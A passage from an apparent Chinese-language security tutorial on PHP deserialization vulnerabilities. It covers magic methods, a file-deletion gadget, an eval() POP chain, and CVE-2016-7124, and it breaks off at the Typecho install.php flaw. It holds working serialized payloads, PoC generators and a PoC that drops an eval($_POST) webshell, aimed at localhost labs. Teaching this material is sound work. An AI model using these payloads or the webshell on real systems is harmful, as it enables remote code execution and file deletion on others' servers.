class="line"><span class="comment">//__tostring会被调用</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$object</span>;</span><br><span class="line"><span class="comment">//脚本结束了，__destuct会被调用</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>文件名是code6.php，测试结果是</p>
+<p>__construct<br />this is a string!<br/>__toString<br />__destruct<br /></p>
+<p><img src="https://secure2.wostatic.cn/static/wJxboV5TApW5ioPzJX8KzR/image.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">//定义类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>    </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">  <span class="comment">//定义两个变量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$variable</span> = <span class="string">&#x27;BUZZ&#x27;</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$variable2</span> = <span class="string">&#x27;OTHER&#x27;</span>; </span><br><span class="line">    <span class="comment">//定义方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">PrintVariable</span>(<span class="params"></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;    </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;variable . <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;    </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__construct&lt;br /&gt;&#x27;</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;    </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__destruct&lt;br /&gt;&#x27;</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;    </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__wakeup&lt;br /&gt;&#x27;</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;    </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__sleep&lt;br /&gt;&#x27;</span>;    </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;variable&#x27;</span>, <span class="string">&#x27;variable2&#x27;</span>);    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;    </span><br><span class="line"><span class="comment">// 创建对象调用__construct  </span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();    </span><br><span class="line"><span class="comment">// 序列化对象调用__sleep    </span></span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);    </span><br><span class="line"><span class="comment">// 输出序列化后的字符串    </span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Serialized: &#x27;</span> . <span class="variable">$serialized</span> . <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;    </span><br><span class="line"><span class="comment">// 重建对象调用__wakeup    </span></span><br><span class="line"><span class="variable">$obj2</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialized</span>);    </span><br><span class="line"><span class="comment">// 调用PintVariable输出数据   </span></span><br><span class="line"><span class="variable">$obj2</span>-&gt;<span class="title function_ invoke__">PrintVariable</span>();    </span><br><span class="line"><span class="comment">// 脚本结束调用__destruct     </span></span><br><span class="line"><span class="meta">?&gt;</span>   </span><br></pre></td></tr></table></figure>
+
+<p>文件名是code7.php，测试结果是：</p>
+<p><img src="https://secure2.wostatic.cn/static/aPjZRvpc1K9MnBiyTNxaXv/image.png"></p>
+<p><strong>安全问题</strong></p>
+<p>现在我们了解序列化是如何工作的，但是我们如何利用它呢?有多种可能的方法，取决于应用程序、可用的类和magic函数。记住，序列化对象包含攻击者控制的对象值。你可能在Web应用程序源代码中找到一个定义__wakeup或__destruct的类，这些函数会影响Web应用程序。例如，我们可能会找 到一个临时将日志存储到文件中的类。当销毁时对象可能不再需要日志文件并将其删除。把下面这段代码保存为code8.php。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>     </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogFile</span>    </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="comment">// log文件名    </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;error.log&#x27;</span>;    </span><br><span class="line">    <span class="comment">// 储存日志文件    </span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">LogData</span>(<span class="params"><span class="variable">$text</span></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;    </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Log some data: &#x27;</span> . <span class="variable">$text</span> . <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;    </span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;filename, <span class="variable">$text</span>, FILE_APPEND);    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__wakeup deletes &quot;&#x27;</span> . <span class="variable language_">$this</span>-&gt;filename . <span class="string">&#x27;&quot; file. &lt;br /&gt;&#x27;</span>;    </span><br><span class="line">       @<span class="title function_ invoke__">unlink</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/&#x27;</span> . <span class="variable language_">$this</span>-&gt;filename); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br><span class="line"><span class="variable">$demo</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&quot;str&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span>   </span><br></pre></td></tr></table></figure>
+
+<p>文件名code8.php，上述代码可以删除服务器中任意文件</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/code6.php?usr_serialized=O:7:%22LogFile%22:1:%7Bs:8:%22filename%22;s:5:%221.php%22;%7D">http://localhost/code6.php?str=O:7:”LogFile”:1:{s:8:”filename”;s:5:”1.php”;}</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">magic_test</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$magic</span> = <span class="string">&quot;This is a magic function&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title class_">L</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Magic function is so funny&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>文件名code9.php，首先看到了参数可控的unserialize,接着看到magic_test类中存在两个魔术方法 __construct和__destruct，其中看到__destruct方法调用了action()，往下看，发现 L 类中存在action但是仅仅是做了打印的操作，没什么利用点，再看Evil方法，发现action调用了敏感操作函数eval，因此，要是我们能够控制test2的值，就能实现任意命令执行，完成攻击。【<a target="_blank" rel="noopener" href="https://annevi.cn/2019/04/20/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">https://annevi.cn/2019/04/20/php反序列化学习总结/</a>】</p>
+<p>在magic_test和Evil，接着我们控制 magic_test中的属性 test的值，为了执行代码，我们将test篡改为Evil的对象，并且篡改Evil的属性 test2为我们需要执行的代码。</p>
+<p>构造payload如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">magic_test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title class_">Evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">magic_test</span>();</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>文件名是code-payload.php，测试结果是：</p>
+<p>O:10:”magic_test”:1:{s:16:”magic_testtest”;O:4:”Evil”:1:{s:5:”test2”;s:10:”phpinfo();”;}}</p>
+<p>提交测试：<a target="_blank" rel="noopener" href="http://127.0.0.1/code9.php?test=O:10:%22magic_test%22:1:%7Bs:16:%22magic_testtest%22;O:4:%22Evil%22:1:%7Bs:5:%22test2%22;s:10:%22phpinfo();%22;%7D">http://127.0.0.1/code9.php?test=O:10:”magic_test”:1:{s:16:”magic_testtest”;O:4:”Evil”:1:{s:5:”test2”;s:10:”phpinfo();”;}</a>}</p>
+<p><img src="https://secure2.wostatic.cn/static/orzZH4DMngJ8YvKVdrnDLC/image.png"></p>
+<p>报错没有结果，找找原因，注意magic_test类下的$test是私有的，序列化的结果应该是%00magic_test%00test，也即发送POC是：</p>
+<p>O:10:”magic_test”:1:{s:16:”%00magic_test%00test”;O:4:”Evil”:1:{s:5:”test2”;s:10:”phpinfo();”;}}</p>
+<p><img src="https://secure2.wostatic.cn/static/wsKrUHorqH5Wh2afEGMqPm/image.png"></p>
+<p>在上课的时候，有小伙伴提到在构造payload，想到使用下面的方法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">magic_test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$test</span>; <span class="comment">#这里权限修饰本来是private，为了方便赋值，先修改成public！</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$e</span>=<span class="keyword">new</span> <span class="title class_">Evil</span>();</span><br><span class="line"><span class="variable">$ser_e</span>= <span class="title function_ invoke__">serialize</span>(<span class="variable">$e</span>);</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">magic_test</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;test=<span class="variable">$ser_e</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到的结果是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:10:&quot;magic_test&quot;:1:&#123;s:4:&quot;test&quot;;s:45:&quot;O:4:&quot;Evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>test属性访问权限换成private之后，得到结果需要修改为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:10:&quot;magic_test&quot;:1:&#123;s:16:&quot;magic_testtest&quot;;s:45:&quot;O:4:&quot;Evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在前端提交时，需要在magic_test前后加%00，也即：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:10:&quot;magic_test&quot;:1:&#123;s:16:&quot;%00magic_test%00test&quot;;s:45:&quot;O:4:&quot;Evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>例外，以上结果中test的值是一个字符串，为了让test能够调用Evil中action方法，需要的是Evil对象，所以需要变换为如下的形式：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:10:&quot;magic_test&quot;:1:&#123;s:16:&quot;%00magic_test%00test&quot;;O:4:&quot;Evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>除了上述的魔法函数，还有如下的函数：</p>
+<p>__call()是在对象上下文中调用不可访问的方法时触发</p>
+<p>__callStatic()是在静态上下文中调用不可访问的方法时触发。</p>
+<p>__get()用于从不可访问的属性读取数据。</p>
+<p>__set()用于将数据写入不可访问的属性。</p>
+<p>__isset()在不可访问的属性上调用isset()或empty()触发。</p>
+<p>__unset()在不可访问的属性上使用unset()时触发。</p>
+<p>__invoke()当脚本尝试将对象调用为函数时，调用__invoke()方法。</p>
+<p><strong>PHP反序列化漏洞原理归纳：</strong></p>
+<p>1、 参数用户可控；</p>
+<p>2、 服务器中代码定义了魔术函数(__wakeup,__sleep,__construct/__destruct/__tostring等)，并且该魔术函数中有危险函数，如命令执行类（exec/passthru/popen/system等）和文件操作类（file_put_contents/file_get_contents/unlink等)等函数；</p>
+<p>3、 用户输入的数据（序列化之后的字符串）未经过滤或者过滤不严谨到达该危险函数，最后执行用户的输入</p>
+<h1 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a><strong>CVE-2016-7124</strong></h1><p>触发该漏洞的PHP版本为PHP5小于5.6.25或PHP7小于7.0.10。漏洞可以简要的概括为：当序列化字符串中表示对象个数的值大于真实的属性个数时会跳过__wakeup()的执行。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$fp</span> = @<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;/var/www/html/&quot;</span>.<span class="variable language_">$this</span>-&gt;b.<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;/var/www/html/&quot;</span>.<span class="variable language_">$this</span>-&gt;b.<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">    @<span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>,<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    @<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">          <span class="keyword">foreach</span>(<span class="title function_ invoke__">get_object_vars</span>(<span class="variable language_">$this</span>) <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="variable">$k</span> = <span class="literal">null</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;Waking up...\n&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;po&#x27;</span>];</span><br><span class="line"><span class="variable">$test_unser</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$test</span>);<span class="comment">//对象</span></span><br><span class="line"><span class="comment">//po=O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;s:1:&quot;b&quot;;s:5:&quot;shell&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>如下的代码也可以练习：</p>
+<p><img src="https://secure2.wostatic.cn/static/pm1ihhd5x4d1CjwLdanFS5/image.png"></p>
+<p>根据CVE-2016-7124构造POC，如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$poc</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$poc</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;poc = <span class="variable">$poc</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;poc != <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="string">&#x27;&lt;?php eval($_POST[\&#x27;shell\&#x27;]);?&gt;&#x27;</span>);</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;Success!!!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;fail to getshell!!!&#x27;</span>);</span><br><span class="line">            &#125;        </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="title function_ invoke__">get_object_vars</span>(<span class="variable language_">$this</span>) <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="variable">$k</span> = <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;waking up...\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Test</span>(<span class="string">&#x27;shell&#x27;</span>);</span><br><span class="line"><span class="variable">$poc</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$poc</span>);</span><br></pre></td></tr></table></figure>
+
+<p>运行poc.php，得到结果如下：</p>
+<p><img src="https://secure2.wostatic.cn/static/tx2paSJxUJj17yhkZrzA7C/image.png"></p>
+<p><a target="_blank" rel="noopener" href="http://localhost/Serialization_vulnerability/CVE_2016_7124/demo.php?poc=O:4">http://localhost/Serialization_vulnerability/CVE_2016_7124/demo.php?poc=O:4</a>:”Test”:1:{s:9:”Test poc”;s:5:”shell”;}</p>
+<p><img src="https://secure2.wostatic.cn/static/7LNYdMMtF3hvSqMBkq9fj8/image.png"></p>
+<p>接下来需要修改两个方面：</p>
+<ul>
+<li>将1改为大于1的任何整数             </li>
+<li> 将Testpoc改为%00Test%00poc</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://localhost/Serialization_vulnerability/CVE_2016_7124/demo.php?poc=O:4">http://localhost/Serialization_vulnerability/CVE_2016_7124/demo.php?poc=O:4</a>:”Test”:3:{s:9:”%00Test%00poc”;s:5:”shell”;}</p>
+<p><img src="https://secure2.wostatic.cn/static/mPrUCZyyKus3WTH5674HSJ/image.png"></p>
+<p>然后getshell，直接访问写的文件：</p>
+<p><img src="https://secure2.wostatic.cn/static/5CVqXszAjFVMZpoUs9991j/image.png"></p>
+<h1 id="Typecho反序列化漏洞"><a href="#Typecho反序列化漏洞" class="headerlink" title="Typecho反序列化漏洞"></a>Typecho反序列化漏洞</h1><p><strong>Typecho</strong></p>
+<p>Typecho是一款内核强健﹑扩展方便﹑体验友好﹑运行流畅的轻量级开源博客程序。基于PHP5开发，使用多种数据库（Mysql，PostgreSQL，SQLite）储存数据。在GPL Version 2许可证下发行，是一个开源的程序，适用范围十分广泛。</p>
+<p><strong>漏洞介绍和复现</strong></p>
+<p>Typecho博客软件存在反序列化导致任意代码执行漏洞，恶意访问者可以利用该漏洞无限制执行代码，获取webshell，存在高安全风险。通过利用install.php页面，直接远程构造恶意请求包，实现远程任意代码执行，对业务造成严重的安全风险。</p>
+<p>影响版本：Typecho 0.9~1.0</p>
+<p>漏洞的入口出现在install.php页面，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断是否已经安装</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;finish&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">file_exists</span>(__TYPECHO_ROOT_DIR__ . <span class="string">&#x27;/config.inc.php&#x27;</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;typecho&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span 